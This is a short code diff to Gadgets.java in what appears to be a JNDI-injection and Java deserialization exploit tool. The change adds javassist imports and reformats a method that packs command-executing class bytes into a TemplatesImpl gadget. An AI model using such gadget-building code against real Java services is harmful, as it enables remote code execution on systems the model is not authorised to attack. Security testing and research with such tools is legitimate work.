@@ -8,6 +8,9 @@ import com.nu1r.jndi.template.CommandTemplate;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
 
 import java.io.Serializable;
 import java.lang.reflect.*;
@@ -81,11 +84,9 @@ public class Gadgets {
         return createTemplatesImpl(type, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, param);
     }
 
-    public static <T> T createTemplatesImpl(PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
-            throws Exception {
-        final T templates = tplClass.newInstance();
-
-        byte[] classBytes = null;
+    public static <T> T createTemplatesImpl(PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param) throws Exception {
+        final T   templates  = tplClass.newInstance();
+        byte[]  classBytes = null;
         switch (type) {
             case nu1r:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
